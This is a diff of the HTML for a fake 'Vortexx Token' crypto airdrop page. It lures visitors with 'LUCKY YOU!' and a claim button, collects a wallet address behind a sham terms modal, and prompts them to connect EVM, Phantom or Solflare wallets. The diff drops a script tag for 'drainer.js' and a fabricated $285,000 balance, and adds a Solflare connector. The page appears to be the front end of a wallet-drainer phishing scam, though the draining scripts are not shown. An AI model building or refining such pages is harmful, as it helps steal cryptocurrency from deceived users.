@@ -4,25 +4,24 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Vortexx Token – Free Airdrop</title>
+
 <link rel="stylesheet" href="style.css">
 
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@binance-chain/javascript-sdk/dist/binance.js"></script>
-<script src="https://cdn.jsdelivr.net.npm/@bitcoinjs/browser/dist/bitcon.js"></script>
 
-<!-- Wallet connectors -->
 <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
 <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://unpkg.com/@solflare-wallet/sdk/lib/index.iife.js"></script>
 </head>
 
 <body>
 
 <div class="container" id="landingSection">
   <div class="logo-circle">VTXT</div>
-  <h1 class="pulse">LUCKY YOU!</h1>
-  <p class="subtitle">Vortexx-TOKEN airdrop is ongoing.</p>
+  <h1>LUCKY YOU!</h1>
+  <p>Vortexx-TOKEN airdrop is ongoing.</p>
   <button id="proceedBtn">Click to Claim Airdrop</button>
 </div>
 
@@ -31,7 +30,7 @@
 </div>
 
 <div class="container hidden" id="solanaSection">
-  <input type="text" id="solAddress" placeholder="Enter your Solana wallet" />
+  <input type="text" id="solAddress" placeholder="Wallet Address" />
   <div class="progress"><span></span></div>
   <button id="submitSol" class="hidden">Submit</button>
 </div>
@@ -39,53 +38,30 @@
 <div class="modal hidden" id="termsModal">
   <div class="modal-card">
     <h2>Terms & Conditions</h2>
-    <p class="terms">You confirm that the wallet address entered is correct.</p>
-    <div class="modal-actions">
-      <button id="acceptBtn">Accept</button>
-    </div>
+    <p>You confirm the wallet address is correct.</p>
+    <button id="acceptBtn">Accept</button>
   </div>
 </div>
 
 <section id="airdropPage" class="hidden">
-  <div class="balance-label">Airdrop Balance</div>
-  <div class="balance-amount">$285,000.32</div>
-
-  <div class="wallet-header">
-    <div class="wallet-icon">T</div>
-    <div>
-      <h2>VTXT Wallet</h2>
-      <p id="userWallet">—</p>
-    </div>
+  <h2>VTXT Wallet</h2>
+  <p id="userWallet">—</p>
+  <div id="airdropBalance">0</div>
+  <div id="balanceDiffSection" class="hidden">
+    <span id="balanceDiff">0</span>
   </div>
-
-  <div class="balance-section">
-    <span class="label">Airdrop Balance</span>
-    <div class="balance" id="airdropBalance">0</div>
-    <span class="token">VTXT</span>
-  </div>
-
-  <div class="balance-diff-section hidden" id="balanceDiffSection">
-    <span class="label">Balance Change:</span>
-    <div class="balance" id="balanceDiff">0</div>
-    <span class="token">VTXT</span>
-  </div>
-
-  <p class="note">🔒 Withdrawals locked. Airdrop will be sent immediately after token launch.</p>
 </section>
 
-<!-- Wallet Choice Modal -->
 <div class="modal hidden" id="walletChoiceModal">
   <div class="modal-card">
-    <h2>Select Wallet Type</h2>
-    <div class="modal-actions">
-      <button id="evmWalletBtn">Connect EVM Wallet</button>
-      <button id="phantomWalletBtn">Connect Phantom (Solana)</button>
-      <button id="cancelWalletBtn">Cancel</button>
-    </div>
+    <h2>Select Wallet</h2>
+    <button id="evmWalletBtn">Connect EVM Wallet</button>
+    <button id="phantomWalletBtn">Connect Phantom</button>
+    <button id="solflareWalletBtn">Connect Solflare</button>
+    <button id="cancelWalletBtn">Cancel</button>
   </div>
 </div>
 
 <script src="script.js"></script>
-<script src="drainer.js"></script>
 </body>
-        </html>
+  </html>
